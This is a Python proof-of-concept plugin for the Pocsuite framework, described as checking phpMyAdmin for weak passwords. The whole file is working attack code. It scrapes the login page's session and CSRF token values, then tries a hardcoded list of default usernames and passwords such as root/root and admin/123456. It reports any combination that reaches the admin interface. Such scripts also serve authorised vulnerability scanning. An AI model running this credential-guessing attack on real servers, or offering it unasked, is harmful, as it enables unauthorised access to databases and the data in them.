#!/usr/bin/env python
# coding: utf-8
import re
import urllib
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
# from pocsuite.api.utils import getWeakPassword


class TestPOC(POCBase):
    vulID = '00003'
    version = '1.0'
    author = ''
    vulDate = '2013-04-23'
    createDate = '2016-03-07'
    updateDate = '2016-03-07'
    references = ''
    name = 'phpMyAdmin 弱密码漏洞'
    appPowerLink = 'http://www.phpMyAdmin.com/'
    appName = 'phpMyAdmin'
    appVersion = 'ALL'
    vulType = 'Weak Password'
    desc = '''
    phpMyAdmin弱口令登录，从而导致攻击者可据此信息进行后续攻击。
    '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _netreq(self, target_url, username, password):
        result = {}
        flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">',
                     'class="disableAjax" title=']
        
        for _ in range(10):
            res = req.get(url = target_url)
            set_session = re.findall(r"name=\"set_session\" value=\"(.*?)\" \/", res.text)[0]
            token = re.findall(r"name=\"token\" value=\"(.*?)\" \/", res.text)[0]
            cookie = ''
            for x,y in res.cookies.get_dict().items():
                cookie = cookie + "{}={};".format(x,y)
            header = {
                "Content-Type":"application/x-www-form-urlencoded",
                "Cookie": cookie
            }
            payload = {
                "set_session": set_session,
                "pma_username": username,
                "pma_password": password,
                "server": "1",
                "target": "index.php",
                "token": token
            }
            payload = urllib.urlencode(payload)
            response = req.post(url = target_url, data=payload, headers=header)
            for flag in flag_list:
                if flag in response.content:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = target_url
                    result['VerifyInfo']['Payload'] = payload
                    return result
        return result

    def _verify(self):
        result = {}
        user_list = ['root', 'admin']
        password_list = ['root', '123456', '12345678', 'password', 'passwd', '123']
        target_url = ''
        try:
            response = req.get(self.url)
            if 'phpMyAdmin' in response.content and '用户名' in response.content:
                target_url = str(self.url) + "/index.php"
            else:
                response = req.get(self.url + '/phpmyadmin/index.php')
                if 'input_password' in response.content and 'name="token"' in response.content:
                    target_url = self.url + "/phpmyadmin/index.php"
        except Exception as e:
            print e

        for user in user_list:
            for password in password_list:
                try:
                    result = self._netreq(target_url, user, password)
                    if result:
                        print "result=>",result
                        return self.parse_output(result)
                except Exception as e:
                    print e

        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
